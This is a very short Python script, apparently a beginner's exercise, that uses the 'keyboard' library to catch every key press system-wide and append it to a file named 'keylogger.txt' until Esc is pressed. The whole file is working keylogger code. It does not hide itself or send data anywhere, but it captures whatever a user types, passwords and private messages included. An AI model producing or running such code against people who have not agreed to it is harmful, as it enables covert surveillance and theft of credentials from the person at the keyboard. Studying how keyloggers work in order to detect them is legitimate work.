import keyboard

def presionar_tecla(event):
    (event.name)
    with open("keylogger.txt", "a") as f:
        f.write(event.name)
        f.close()
keyboard.on_press(presionar_tecla)
keyboard.wait('esc')